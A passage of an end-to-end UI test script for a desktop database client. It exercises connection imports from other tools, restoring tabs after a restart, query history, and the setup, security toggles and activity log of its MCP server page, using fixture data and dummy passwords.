    await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
    await page.getByRole("button", { name: "Import from TablePlus…" }).click();
    const importer = page.locator(".modal.wizard");
    await importer.getByRole("heading", { name: "Import from TablePlus" }).waitFor();
    // The export is encrypted: nothing is listed until its password opens it.
    await importer.getByText("This file is encrypted.", { exact: false }).waitFor();
    const password = importer.getByLabel("Export password");
    await password.fill("not-the-password");
    await importer.getByRole("button", { name: "Open", exact: true }).click();
    await importer.getByRole("alert").filter({ hasText: "That password does not open this file." }).waitFor();
    await shot("sdb-51-import-tableplus-password");
    await password.fill("fixture-export-pw");
    await importer.getByRole("button", { name: "Open", exact: true }).click();
    const list = importer.getByRole("list", { name: "TablePlus connections" });
    const item = (name) => list.getByRole("listitem").filter({ has: page.getByRole("checkbox", { name, exact: true }) });
    await importer.getByRole("radio", { name: "Personal", exact: true }).check();
    // Its production tag is our Production type; the password it exported comes along.
    await item("Orders PG").locator(".conn-import-detail").filter({ hasText: "TLS verify-ca · prod · password saved" }).waitFor();
    await item("PG via bastion").getByText("SSH spelaion@127.0.0.1:2221").waitFor();
    // The SSH key's contents are never kept: the preview says what to do instead.
    await item("PG via bastion").getByText("setting is not imported", { exact: false }).click();
    await item("PG via bastion").getByText("carries the private key itself", { exact: false }).waitFor();
    const names = ["Orders PG", "Shop MySQL", "Shop MariaDB", "Reports MSSQL", "Local file", "Analytics", "PG via bastion"];
    // The DataGrip import above made connections with these names: import them as copies.
    for (const name of names) {
      const duplicate = importer.getByRole("combobox", { name: `What to do with ${name}` });
      if (await duplicate.count()) await duplicate.selectOption({ label: "Import it as a copy" });
      else await list.getByRole("checkbox", { name, exact: true }).check();
    }
    await importer.getByRole("textbox", { name: "Put them in" }).fill("TablePlus");
    await importer.getByRole("checkbox", { name: "Store the passwords TablePlus saved in the system keychain" }).uncheck();
    await shot("sdb-51-import-tableplus");
    await importer.getByRole("button", { name: "Import 7 connections" }).click();
    await importer.getByRole("status").filter({ hasText: "Imported 7 connections." }).waitFor();
    await shot("sdb-51-import-tableplus-done");
    await importer.getByRole("button", { name: "Done", exact: true }).click();
    await importer.waitFor({ state: "detached" });
    // Its "Prod" group is a folder inside the one chosen.
    const files = readdirSync(join(userDir, "connections", "tableplus"), { recursive: true }).filter((f) => String(f).endsWith(".toml"));
    assert.equal(files.length, 7, files.join(", "));
    const orders = files.find((f) => String(f).startsWith("prod"));
    assert.ok(orders, files.join(", "));
    const text = readFileSync(join(userDir, "connections", "tableplus", String(orders)), "utf8");
    assert.match(text, /env = "prod"/);
    for (const file of files) {
      assert.doesNotMatch(readFileSync(join(userDir, "connections", "tableplus", String(file)), "utf8"), /fake-password-123/);
    }
    await page.evaluate(() => delete window.__spelaionImportDirs);
  }

  step("import from HeidiSQL: real portable settings, folders and SSH");
  {
    const exportFile = join(root, "crates/spelaion-config/tests/fixtures/heidisql/heidisql-12.22.txt");
    await page.evaluate((file) => (window.__spelaionImportDirs = { heidisql: file }), exportFile);
    await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
    await page.getByRole("button", { name: "Import from HeidiSQL…" }).click();
    const importer = page.locator(".modal.wizard");
    await importer.getByRole("heading", { name: "Import from HeidiSQL" }).waitFor();
    const list = importer.getByRole("list", { name: "HeidiSQL connections" });
    const item = (name) => list.getByRole("listitem").filter({ has: page.getByRole("checkbox", { name, exact: true }) });
    await item("Local").getByText("Examples").waitFor();
    await item("SSH").getByText("SSH tunnel-user@bastion.example.test:2222", { exact: false }).waitFor();
    await importer.getByRole("radio", { name: "Personal", exact: true }).check();
    for (const name of ["Local", "SSH"]) {
      const duplicate = importer.getByRole("combobox", { name: `What to do with ${name}` });
      if (await duplicate.count()) await duplicate.selectOption({ label: "Import it as a copy" });
      else await list.getByRole("checkbox", { name, exact: true }).check();
    }
    await importer.getByRole("textbox", { name: "Put them in" }).fill("HeidiSQL");
    await importer.getByRole("checkbox", { name: "Store the passwords HeidiSQL saved in the system keychain" }).uncheck();
    await shot("sdb-52-import-heidisql");
    await importer.getByRole("button", { name: "Import 2 connections" }).click();
    await importer.getByRole("status").filter({ hasText: "Imported 2 connections." }).waitFor();
    await importer.getByRole("button", { name: "Done", exact: true }).click();
    await importer.waitFor({ state: "detached" });
    const files = readdirSync(join(userDir, "connections", "heidisql"), { recursive: true }).filter((f) => String(f).endsWith(".toml"));
    assert.equal(files.length, 2, files.join(", "));
    assert.ok(files.every((file) => String(file).startsWith("examples")), files.join(", "));
    await page.evaluate(() => delete window.__spelaionImportDirs);
  }

  step("import from MySQL Workbench: the connections.xml a real Workbench wrote, its group, SSH tunnel, TLS and what is not imported");
  {
    // SPELAION_WORKBENCH_DIR is Workbench's folder here: nothing to pick.
    await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
    await page.getByRole("button", { name: "Import from MySQL Workbench…" }).click();
    const importer = page.locator(".modal.wizard");
    await importer.getByRole("heading", { name: "Import from MySQL Workbench" }).waitFor();
    const list = importer.getByRole("list", { name: "MySQL Workbench connections" });
    const item = (name) => list.getByRole("listitem").filter({ has: page.getByRole("checkbox", { name, exact: true }) });
    await importer.getByRole("radio", { name: "Personal", exact: true }).check();
    await item("Orders via bastion").getByText("SSH spelaion@127.0.0.1:2221").waitFor();
    await item("Shop MariaDB TLS").locator(".conn-import-detail").filter({ hasText: "TLS verify-ca" }).waitFor();
    // Workbench's "Prod/…" names are a group: a folder here.
    await item("Shop MariaDB TLS").getByText("· Prod").waitFor();
    // A named pipe cannot be opened: listed, never chosen.
    assert.ok(await list.getByRole("checkbox", { name: "Local pipe", exact: true }).isDisabled());
    await item("Local pipe").getByText("named pipe", { exact: false }).waitFor();
    // The DataGrip import above made "Shop MySQL" (127.0.0.1:13306/spelaion as spelaion).
    await item("Shop MySQL").getByText("Already in SpelaionDB as Shop MySQL").waitFor();
    assert.ok(!(await list.getByRole("checkbox", { name: "Shop MySQL", exact: true }).isChecked()));
    // Nothing is dropped silently: the SQL mode, and the password kept in Workbench's vault.
    await item("Shop MariaDB TLS").getByText("4 settings are not imported").click();
    await item("Shop MariaDB TLS").getByText("SQL mode: ANSI_QUOTES", { exact: false }).waitFor();
    await item("Shop MariaDB TLS").getByText("it is in its vault", { exact: false }).waitFor();
    await importer.getByRole("textbox", { name: "Put them in" }).fill("Workbench");
    await shot("sdb-53-import-workbench");
    await importer.getByRole("button", { name: "Import 2 connections" }).click();
    await importer.getByRole("status").filter({ hasText: "Imported 2 connections." }).waitFor();
    await shot("sdb-53-import-workbench-done");
    await importer.getByRole("button", { name: "Done", exact: true }).click();
    await importer.waitFor({ state: "detached" });
    const prod = join(userDir, "connections", "workbench", "prod");
    const tls = readFileSync(join(prod, "shop-mariadb-tls.toml"), "utf8");
    assert.match(tls, /verify-ca/);
    assert.match(tls, /ca\.crt/);
    const bastion = readFileSync(join(prod, "orders-via-bastion.toml"), "utf8");
    assert.match(bastion, /tunnel = "spelaion-127-0-0-1"/);
    assert.ok(!existsSync(join(userDir, "connections", "workbench", "shop-mysql.toml")));
  }

  step("import from pgAdmin: the servers file a real pgAdmin exported, its groups, SSH tunnel, TLS and the passwords it never exports");
  {
    // The export a real pgAdmin 4 wrote (crates/spelaion-config/tests/fixtures/pgadmin/README.md).
    const exportFile = join(root, "crates/spelaion-config/tests/fixtures/pgadmin/pgadmin-9.19-servers.json");
    await page.evaluate((file) => (window.__spelaionImportDirs = { pgadmin: file }), exportFile);
    await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
    await page.getByRole("button", { name: "Import from pgAdmin…" }).click();
    const importer = page.locator(".modal.wizard");
    await importer.getByRole("heading", { name: "Import from pgAdmin" }).waitFor();
    // An export file can be picked instead of pgAdmin's own database.
    await importer.getByRole("button", { name: "Choose export file…" }).waitFor();
    const list = importer.getByRole("list", { name: "pgAdmin connections" });
    const item = (name) => list.getByRole("listitem").filter({ has: page.getByRole("checkbox", { name, exact: true }) });
    await importer.getByRole("radio", { name: "Personal", exact: true }).check();
    await item("PG via bastion").getByText("SSH spelaion@127.0.0.1:2221").waitFor();
    await item("Orders TLS").locator(".conn-import-detail").filter({ hasText: "TLS verify-ca" }).waitFor();
    // Server groups are folders.
    await item("Orders TLS").getByText("· Production").waitFor();
    await item("Local PG").getByText("· Servers").waitFor();
    // A pg_service.conf server cannot be opened: listed, never chosen.
    assert.ok(await list.getByRole("checkbox", { name: "Analytics service", exact: true }).isDisabled());
    await item("Analytics service").getByText("pg_service.conf", { exact: false }).waitFor();
    // The DBeaver import above made a connection to the same database as these.
    await item("Local PG").getByText("Already in SpelaionDB as", { exact: false }).waitFor();
    // pgAdmin exports no passwords: the preview says each one is asked when connecting.
    await item("Orders TLS").getByText("3 settings are not imported").click();
    await item("Orders TLS").getByText("pgAdmin does not export passwords; it is asked when connecting", { exact: false }).waitFor();
    await item("Orders TLS").getByText("Role: reporting", { exact: false }).waitFor();
    for (const name of ["Local PG", "Orders TLS", "PG via bastion"]) {
      const duplicate = importer.getByRole("combobox", { name: `What to do with ${name}` });
      if (await duplicate.count()) await duplicate.selectOption({ label: "Import it as a copy" });
      else await list.getByRole("checkbox", { name, exact: true }).check();
    }
    await importer.getByRole("textbox", { name: "Put them in" }).fill("pgAdmin");
    await shot("sdb-54-import-pgadmin");
    await importer.getByRole("button", { name: "Import 3 connections" }).click();
    await importer.getByRole("status").filter({ hasText: "Imported 3 connections." }).waitFor();
    await shot("sdb-54-import-pgadmin-done");
    await importer.getByRole("button", { name: "Done", exact: true }).click();
    await importer.waitFor({ state: "detached" });
    const base = join(userDir, "connections", "pgadmin");
    const files = readdirSync(base, { recursive: true }).map(String).filter((f) => f.endsWith(".toml"));
    assert.equal(files.length, 3, files.join(", "));
    const orders = files.find((f) => f.startsWith("production") && f.includes("orders-tls"));
    assert.ok(orders, files.join(", "));
    const text = readFileSync(join(base, orders), "utf8");
    assert.match(text, /verify-ca/);
    assert.match(text, /Orders of the EU shop/);
    const bastion = files.find((f) => f.startsWith("production") && f.includes("pg-via-bastion"));
    assert.ok(bastion, files.join(", "));
    assert.match(readFileSync(join(base, bastion), "utf8"), /tunnel = "spelaion-127-0-0-1"/);
    assert.ok(files.some((f) => f.startsWith("servers")), files.join(", "));
    await page.evaluate(() => delete window.__spelaionImportDirs);
  }

  step("import from Beekeeper Studio: the connections a real Beekeeper saved, its folder, SSH tunnel, TLS, colour and a saved password");
  {
    // Beekeeper's data folder, from what a real Beekeeper Studio wrote
    // (crates/spelaion-config/tests/fixtures/beekeeper/README.md): app.db and its .key, with one
    // password encrypted by Beekeeper's own encryptor.
    const fixtures = join(root, "crates/spelaion-config/tests/fixtures/beekeeper");
    const dataDir = join(userDir, "beekeeper-studio");
    mkdirSync(dataDir, { recursive: true });
    const { DatabaseSync } = await import("node:sqlite");
    const db = new DatabaseSync(join(dataDir, "app.db"));
    db.exec(readFileSync(join(fixtures, "beekeeper-6.2.2.sql"), "utf8"));
    const saved = JSON.parse(readFileSync(join(fixtures, "passwords.json"), "utf8"));
    db.prepare("UPDATE saved_connection SET password = ? WHERE name = 'Orders TLS'").run(saved.password);
    db.close();
    copyFileSync(join(fixtures, ".key"), join(dataDir, ".key"));
    await page.evaluate((dir) => (window.__spelaionImportDirs = { beekeeper: dir }), dataDir);
    await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
    await page.getByRole("button", { name: "Import from Beekeeper Studio…" }).click();
    const importer = page.locator(".modal.wizard");
    await importer.getByRole("heading", { name: "Import from Beekeeper Studio" }).waitFor();
    const list = importer.getByRole("list", { name: "Beekeeper Studio connections" });
    const item = (name) => list.getByRole("listitem").filter({ has: page.getByRole("checkbox", { name, exact: true }) });
    await importer.getByRole("radio", { name: "Personal", exact: true }).check();
    await item("PG via bastion").getByText("SSH spelaion@127.0.0.1:2221").waitFor();
    await item("Orders TLS").locator(".conn-import-detail").filter({ hasText: "TLS verify-full" }).waitFor();
    // Its folder, and the password Beekeeper saved (decrypted as Beekeeper does, never shown).
    await item("Orders TLS").getByText("· Production").waitFor();
    await item("Orders TLS").getByText("password saved", { exact: false }).waitFor();
    // An engine SpelaionDB cannot open: listed, never chosen.
    assert.ok(await list.getByRole("checkbox", { name: "Warehouse", exact: true }).isDisabled());
    await item("Warehouse").getByText("Amazon Redshift is not supported yet", { exact: false }).waitFor();
    // Its colour is listed, not imported (ADR-029).
    await item("Shop MySQL").getByText("setting is not imported", { exact: false }).click();
    await item("Shop MySQL").getByText("Colour: red", { exact: false }).waitFor();
    for (const name of ["Orders TLS", "PG via bastion", "Shop MySQL"]) {
      const duplicate = importer.getByRole("combobox", { name: `What to do with ${name}` });
      if (await duplicate.count()) await duplicate.selectOption({ label: "Import it as a copy" });
      else await list.getByRole("checkbox", { name, exact: true }).check();
    }
    // New connections start ticked: leave Beekeeper's own demo database and the file out.
    for (const name of ["Demo Database", "Shop file"]) {
      const box = list.getByRole("checkbox", { name, exact: true });
      if (await box.isChecked()) await box.uncheck();
    }
    await importer.getByRole("textbox", { name: "Put them in" }).fill("Beekeeper");
    // Never the user's real keychain from the smoke test: the password is asked instead.
    await importer.getByRole("checkbox", { name: "Store the passwords Beekeeper Studio saved in the system keychain" }).uncheck();
    await shot("sdb-55-import-beekeeper");
    await importer.getByRole("button", { name: "Import 3 connections" }).click();
    await importer.getByRole("status").filter({ hasText: "Imported 3 connections." }).waitFor();
    await shot("sdb-55-import-beekeeper-done");
    await importer.getByRole("button", { name: "Done", exact: true }).click();
    await importer.waitFor({ state: "detached" });
    const base = join(userDir, "connections", "beekeeper");
    const files = readdirSync(base, { recursive: true }).map(String).filter((f) => f.endsWith(".toml"));
    assert.equal(files.length, 3, files.join(", "));
    const orders = files.find((f) => f.startsWith("production") && f.includes("orders-tls"));
    assert.ok(orders, files.join(", "));
    assert.match(readFileSync(join(base, orders), "utf8"), /verify-full/);
    const bastion = files.find((f) => f.startsWith("production") && f.includes("pg-via-bastion"));
    assert.ok(bastion, files.join(", "));
    assert.match(readFileSync(join(base, bastion), "utf8"), /tunnel = "spelaion-127-0-0-1"/);
    const mysql = files.find((f) => f.includes("shop-mysql"));
    assert.ok(mysql, files.join(", "));
    assert.match(readFileSync(join(base, mysql), "utf8"), /read_only = true/);
    for (const file of files) {
      assert.doesNotMatch(readFileSync(join(base, file), "utf8"), /fake-password-123/);
    }
    await page.evaluate(() => delete window.__spelaionImportDirs);
  }

  step("open tabs survive a restart (ADR-036): a file and two consoles come back with their text, disconnected, and nothing runs");
  const restartFile = join(userDir, "sql files", "restart.sql");
  writeFileSync(restartFile, "select 'restart_file_marker';\n");
  {
    // Only these three tabs: the others are closed first (pinned ones unpinned).
    while (await page.locator(".tabbar .tab .tab-unpin").count() > 0) await page.locator(".tabbar .tab .tab-unpin").first().click();
    await page.keyboard.press("Control+Shift+W");
    for (let i = 0; i < 20 && await page.locator(".tabbar .tab").count() > 0; i++) {
      await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 0 || document.querySelector('[role="dialog"] .modal-actions .danger'));
      const danger = page.locator('[role="dialog"] .modal-actions .danger');
      if (await danger.count() > 0) await danger.click();
    }
    await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 0);
    await newQuery("Shop (SQLite)", "select 'restart_console_marker' as restored;");
    await page.keyboard.press("Control+t");
    await page.locator(".tab-panel:not([hidden]) .cm-content").click();
    await page.keyboard.insertText("-- second console, no connection");
    await page.evaluate((path) => { window.__spelaionOpenPath = path; }, restartFile);
    await page.keyboard.press("Control+o");
    await page.locator(".tabbar .tab.active .tab-label", { hasText: "restart.sql" }).waitFor();
    await page.evaluate(() => { delete window.__spelaionOpenPath; });
    // An unsaved change: it comes back unsaved.
    await page.locator(".tab-panel:not([hidden]) .cm-content").click();
    await page.keyboard.press("Control+End");
    await page.keyboard.insertText("-- unsaved line");
    await page.locator(".tabbar .tab.active .tab-unsaved").waitFor();
    assert.equal(await page.locator(".tabbar .tab").count(), 3);
    // The core writes the tabs at most 1.25 s after a change; the app is then killed (as a
    // crash would) unless it closes cleanly below.
    await page.waitForTimeout(2_000);
  }
  step("history, theme and per-connection preference survive an app restart");
  if (process.env.SPELAION_TEST_K8S && process.platform === "win32") {
    // Closing the tabs above closed the Kubernetes session, and its kubectl with it. The
    // connection is opened again in the explorer (no tab, so the three tabs stay the only
    // ones), so the app below is closed with a port-forward running.
    await page.locator('.connection-row:has-text("PG in Kubernetes") .twisty').click();
    const asked = page.getByRole("dialog").getByText("Password for PG in Kubernetes");
    const schema = page.getByRole("button", { name: "Expand or collapse schema public" });
    await asked.or(schema).first().waitFor();
    if (await asked.isVisible()) {
      await page.getByLabel("Password", { exact: true }).fill("spelaion");
      await page.getByRole("button", { name: "Connect", exact: true }).click();
    }
    await schema.waitFor();
    assert.equal(await page.locator(".tabbar .tab").count(), 3);
  }
  await setLanguage("es");
  await setTheme("dark", "dark");
  await browser.close();
  if (process.env.SPELAION_TEST_K8S && process.platform === "win32") {
    // The Kubernetes connection is open in the explorer: closing the app stops its kubectl.
    assert.ok(testKubectls().length > 0, "the port-forward is running");
    await closeApp();
    assert.deepEqual(testKubectls(), [], "kubectl outlived the app");
  } else {
    await stopApp();
  }
  // While the app is closed, the repository changes as a `git pull` would (ADR-022).
  writeFileSync(shopFile, shopOriginal.replace("max_rows = 100", "max_rows = 50"));
  // And a personal connection whose file is a variable each person fills in (ADR-022).
  mkdirSync(join(userDir, "connections"), { recursive: true });
  writeFileSync(
    join(userDir, "connections", "vars-demo.toml"),
    'schema_version = 1\nname = "Personal vars"\nengine = "sqlite"\ndatabase = "${user.demo_db}"\n',
  );
  app = startApp();
  browser = await connect();
  page = browser.contexts()[0].pages()[0];
  page.setDefaultTimeout(30_000);
  await page.getByRole("button", { name: "Configuración", exact: true }).waitFor();
  assert.equal(await page.locator("html").getAttribute("lang"), "es");
  {
    // The three tabs are back, in order, with their text; disconnected, without results.
    const tabs = page.locator(".tabbar .tab");
    await tabs.nth(2).waitFor();
    assert.equal(await tabs.count(), 3);
    const labels = await page.locator(".tabbar .tab .tab-label").allInnerTexts();
    assert.equal(labels[2], "restart.sql");
    // Each tab shown in turn (an editor only draws its lines while it is shown).
    const texts = [];
    for (let i = 0; i < 3; i++) {
      await tabs.nth(i).locator(".tab-label").click();
      texts.push((await page.locator(".tab-panel:not([hidden]) .cm-line").evaluateAll((lines) => lines.map((l) => l.textContent))).join("\n"));
    }
    assert.deepEqual(texts, [
      "select 'restart_console_marker' as restored;",
      "-- second console, no connection",
      "select 'restart_file_marker';\n-- unsaved line",
    ]);
    assert.equal(await page.locator(".tabbar .tab.active .tab-label").innerText(), "restart.sql");
    await page.locator(".tabbar .tab.active .tab-unsaved").waitFor();
    assert.equal(await page.locator(".tabbar .tab .dot-disconnected").count(), 3);
    assert.equal(await page.locator(".tab-panel").first().locator("select").first().evaluate((el) => el.selectedOptions[0].text), "Shop (SQLite) (sqlite)");
    await page.waitForTimeout(500);
    assert.equal(await page.locator(".tab-panel .grid-host").count(), 0, "a restored tab runs nothing");
    assert.equal(await page.locator(".tabbar .tab-running, .tabbar .tab .dot-connected").count(), 0);
    assert.ok(!readFileSync(restartFile, "utf8").includes("unsaved line"), "nothing was saved on its own");
    await shot("10b-tabs-restored");
  }
  assert.equal(await page.locator("html").getAttribute("data-theme"), "dark");
  assert.equal(await savedLanguage(), "es");
  await setLanguage("en");
  await setTheme("system", systemTheme);
  await page.getByText("Shop (SQLite)", { exact: true }).waitFor();
  await page.locator(".connection-row", { hasText: "Docker PG (edited)" }).waitFor();
  assert.equal(await page.locator(".connection-row", { hasText: "Shop copy" }).count(), 0);
  assert.equal(await historySaving("Shop (SQLite)"), false);
  step("a repository connection changed since it was trusted is shown before it is used");
  // History saving is still off for this connection: this first run is not recorded.
  panel = await newQuery("Shop (SQLite)", "select 'history_resumed_marker' as resumed;");
  await run(panel);
  const change = page.getByRole("dialog", { name: "This changed since you trusted the repository" });
  await change.locator("tr", { hasText: "mcp.max_rows" }).filter({ hasText: "100" }).filter({ hasText: "50" }).waitFor();
  await change.getByText("the connection shop", { exact: false }).waitFor();
  await shot("10a-repository-change");
  await change.getByRole("button", { name: "Accept the change" }).click();
  await change.waitFor({ state: "detached" });
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  history = page.getByRole("complementary", { name: "Query history", exact: true });
  await history.getByRole("textbox", { name: "Search query history" }).fill("round");
  await waitForHistoryCount(1);
  await history.locator(".history-sql", { hasText: "group by c.country" }).waitFor();
  await history.getByRole("textbox", { name: "Search query history" }).fill("private");
  await history.getByText("No matching queries.", { exact: true }).waitFor();
  await page.getByRole("button", { name: "Close query history" }).click();
  await setHistorySaving("Shop (SQLite)", true);
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  await history.getByRole("textbox", { name: "Search query history" }).fill("history_resumed_marker");
  await waitForHistoryCount(1);
  await history.locator(".history-sql", { hasText: "history_resumed_marker" }).waitFor();
  await shot("10-history-persisted");

  step("history: cancelled queries translate without changing database errors");
  await page.getByRole("button", { name: "Close query history" }).click();
  panel = await newQuery("Shop (SQLite)", "with recursive cancel_history_marker(x) as (select 1 union all select x + 1 from cancel_history_marker where x < 100000000) select x from cancel_history_marker;");
  await run(panel);
  await panel.locator(".grid-host").waitFor();
  // Rows keep streaming in while Cancel is clicked: redrawing on every batch used to keep the
  // window too busy to take the click (the core now thins the row counts to a few a second).
  await panel.getByRole("button", { name: "Cancel", exact: true }).click();
  await panel.getByRole("button", { name: "Run", exact: true }).waitFor();
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  await history.getByRole("textbox", { name: "Search query history" }).fill("cancel_history_marker");
  await waitForHistoryCount(1);
  await history.getByText("Error details", { exact: true }).click();
  await history.locator(".history-error", { hasText: "Query cancelled" }).waitFor();
  await setLanguage("es");
  await page.locator("#query-history .history-error", { hasText: "Consulta cancelada" }).waitFor();
  await setLanguage("en");

  step("history: load older queries in bounded pages");
  await page.getByRole("button", { name: "Close query history" }).click();
  await replaceQuery(panel, Array.from({ length: 105 }, (_, i) => `select ${i} as history_page_marker;`).join("\n"));
  await run(panel);
  // Run's old button remains visible while async preflight runs. Wait for this script's
  // completion summary before taking the history snapshot: new entries reset its anchor.
  await panel.locator(".statusline", { hasText: "105 OK, 0 failed, 0 not run" }).waitFor();
  await panel.getByRole("button", { name: "Run", exact: true }).waitFor();
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  await history.getByRole("textbox", { name: "Search query history" }).fill("history_page_marker");
  // Newest first: page 1 is statements 104 to 55, page 2 is 54 to 5 and page 3 is 4 to 0.
  const pageStatements = await waitForHistoryPage("history_page_marker", 104, 55);
  assert.ok(await history.getByRole("button", { name: "Previous", exact: true }).isDisabled());
  for (const [number, first, last] of [[2, 54, 5], [3, 4, 0]]) {
    await history.getByRole("button", { name: "Next", exact: true }).click();
    await history.getByText(`Page ${number}`, { exact: true }).waitFor();
    pageStatements.push(...await waitForHistoryPage("history_page_marker", first, last));
  }
  assert.equal(pageStatements.length, 105);
  assert.equal(new Set(pageStatements).size, 105);
  assert.ok(await history.getByRole("button", { name: "Next", exact: true }).isDisabled());
  await history.getByRole("button", { name: "Previous", exact: true }).click();
  await history.getByText("Page 2", { exact: true }).waitFor();
  assert.deepEqual(await waitForHistoryPage("history_page_marker", 54, 5), pageStatements.slice(50, 100));
  await shot("11-history-pages");

  step("personal variables a connection needs are asked once and saved in user.toml");
  await page.getByRole("button", { name: "Close query history" }).click();
  const varsPanel = await newQuery("Personal vars", "select count(*) as n from product;");
  await run(varsPanel);
  const variables = page.getByRole("dialog", { name: "This connection needs some personal values" });
  await variables.getByText("${user.demo_db}", { exact: true }).waitFor();
  await shot("11a-personal-variables");
  await variables.getByLabel("demo_db", { exact: true }).fill(join(demo, "data", "shop.db").replaceAll("\\", "/"));
  await variables.getByRole("button", { name: "Save and connect" }).click();
  await variables.waitFor({ state: "detached" });
  await varsPanel.locator(".statusline", { hasText: "1 row" }).waitFor();
  assert.match(readFileSync(join(userDir, "user.toml"), "utf8"), /demo_db = ".*shop\.db"/);

  step("MCP server page: a client is set up only after its change is shown, with a backup");
  // Every client file lives under this run's own folder (SPELAION_MCP_CLIENTS_HOME), and the
  // command written is a stand-in (SPELAION_CLI): the user's real files are never touched.
  const desktopFile = join(clientsHome, "AppData", "Roaming", "Claude", "claude_desktop_config.json");
  if (process.platform === "win32") {
    mkdirSync(dirname(desktopFile), { recursive: true });
    writeFileSync(desktopFile, '{\n  "globalShortcut": "",\n  "mcpServers": {\n    "other": { "command": "other-server" }\n  }\n}\n');
  }
  await page.getByRole("button", { name: "MCP server", exact: true }).click();
  const mcp = page.locator(".mcp-page");
  await mcp.getByRole("heading", { name: "MCP server", level: 1 }).waitFor();
  await mcp.getByRole("tab", { name: "Configuration", selected: true }).waitFor();
  await mcp.locator(".mcp-cli code", { hasText: fakeCli }).waitFor();
  const clientCards = mcp.getByRole("list", { name: "AI clients" }).getByRole("group");
  await clientCards.first().waitFor();
  assert.equal(await clientCards.count(), 6);
  for (const path of await mcp.locator(".mcp-client-path").allTextContents()) {
    assert.ok(path.startsWith(clientsHome), `${path} is outside the run's folder`);
  }
  await shot("mcp-configuration");
  if (process.platform === "win32") {
    const desktop = clientCards.filter({ hasText: "Claude Desktop" });
    await desktop.locator(".mcp-state", { hasText: "Not set up" }).waitFor();
    await desktop.getByRole("button", { name: "Install configuration" }).click();
    const install = page.getByRole("dialog", { name: "Set up Claude Desktop" });
    await install.getByText("Only SpelaionDB's entry changes in:").waitFor();
    await install.locator(".diff-added", { hasText: '"spelaiondb": {' }).waitFor();
    assert.equal(await install.locator(".diff-removed", { hasText: "globalShortcut" }).count(), 0);
    await shot("mcp-install-diff");
    // Cancel writes nothing.
    await install.getByRole("button", { name: "Cancel" }).click();
    await install.waitFor({ state: "detached" });
    assert.ok(!readFileSync(desktopFile, "utf8").includes("spelaiondb"));
    await desktop.getByRole("button", { name: "Install configuration" }).click();
    await install.getByRole("button", { name: "Write the file" }).click();
    await install.waitFor({ state: "detached" });
    await mcp.getByRole("status").filter({ hasText: "Claude Desktop is set up" }).waitFor();
    await desktop.locator(".mcp-state", { hasText: /^Set up$/ }).waitFor();
    assert.equal(await desktop.getByRole("button", { name: "Install configuration" }).isDisabled(), true);
    const written = JSON.parse(readFileSync(desktopFile, "utf8"));
    assert.equal(written.mcpServers.spelaiondb.command, fakeCli);
    assert.deepEqual(written.mcpServers.spelaiondb.args, ["mcp"]);
    assert.equal(written.mcpServers.other.command, "other-server");
    assert.equal(written.globalShortcut, "");
    assert.ok(
      readdirSync(dirname(desktopFile)).some((name) => name.startsWith("claude_desktop_config.json.spelaion-backup-")),
      "a backup of the previous file is kept",
    );
  }
  // A client without a file: it is created with only our server.
  const cursor = clientCards.filter({ hasText: "Cursor" });
  await cursor.getByRole("button", { name: "Install configuration" }).click();
  const cursorInstall = page.getByRole("dialog", { name: "Set up Cursor" });
  await cursorInstall.getByText("This file will be created:").waitFor();
  await cursorInstall.getByRole("button", { name: "Write the file" }).click();
  await cursorInstall.waitFor({ state: "detached" });
  await cursor.locator(".mcp-state", { hasText: /^Set up$/ }).waitFor();
  assert.deepEqual(JSON.parse(readFileSync(join(clientsHome, ".cursor", "mcp.json"), "utf8")), {
    mcpServers: { spelaiondb: { command: fakeCli, args: ["mcp"] } },
  });
  // The manual configuration of the selected client, and Claude Code's command.
  await clientCards.filter({ hasText: "Codex" }).getByRole("button", { name: "Codex", exact: true }).click();
  await mcp.getByRole("complementary", { name: "Manual configuration for Codex" }).getByText("[mcp_servers.spelaiondb]").waitFor();
  await clientCards.filter({ hasText: "Claude Code" }).getByRole("button", { name: "Claude Code", exact: true }).click();
  await mcp.getByLabel("claude mcp add command").getByText("claude mcp add --scope user spelaiondb --", { exact: false }).waitFor();
  assert.ok(!existsSync(join(clientsHome, ".claude.json")), "nothing is written without a click");

  step("MCP server page, Security: default tool output and read-only mode for every agent");
  await mcp.getByRole("tab", { name: "Security" }).click();
  const shopAccess = mcp.locator('tr[data-connection="shop"]');
  await shopAccess.getByText("The connection does not let agents write.").waitFor();
  await mcp.getByRole("radio", { name: /TOON/ }).check();
  await mcp.getByRole("switch", { name: "Every agent is read-only" }).check();
  await shopAccess.getByText("Read-only mode is on.").waitFor();
  await shot("mcp-security");
  // Both are kept: leave the page and come back.
  await page.getByRole("button", { name: "Connections", exact: true }).click();
  await mcp.waitFor({ state: "detached" });
  await page.getByRole("button", { name: "MCP server", exact: true }).click();
  await mcp.getByRole("tab", { name: "Security" }).click();
  await mcp.getByRole("switch", { name: "Every agent is read-only" }).and(page.locator(":checked")).waitFor();
  await mcp.getByRole("radio", { name: /TOON/ }).and(page.locator(":checked")).waitFor();
  await mcp.getByRole("switch", { name: "Every agent is read-only" }).uncheck();
  await shopAccess.getByText("The connection does not let agents write.").waitFor();
  await page.getByRole("button", { name: "Connections", exact: true }).click();
  await mcp.waitFor({ state: "detached" });

  step("MCP server page, Activity: calls from a real spelaiondb mcp, filtered, exported and cleared");
  await page.getByRole("button", { name: "MCP server", exact: true }).click();
  await mcp.getByRole("tab", { name: "Activity" }).click();
  await mcp.getByText("No MCP calls yet.", { exact: false }).waitFor();
  // A real agent session over stdio, as an AI client runs it, on this run's folder.
  await agentSession([
    ["run_query", { connection: "shop", sql: "select count(*) as n from product" }],
    ["execute_write", { connection: "shop", sql: "insert into product (name) values ('x')" }],
    ["execute_write", { connection: "shop", sql: "alter user bob password 'hunter2'" }],
  ]);
  await mcp.getByRole("button", { name: "Refresh" }).click();
  await mcp.getByRole("status").filter({ hasText: "4 events" }).waitFor();
  const events = mcp.getByRole("table", { name: "Events" });
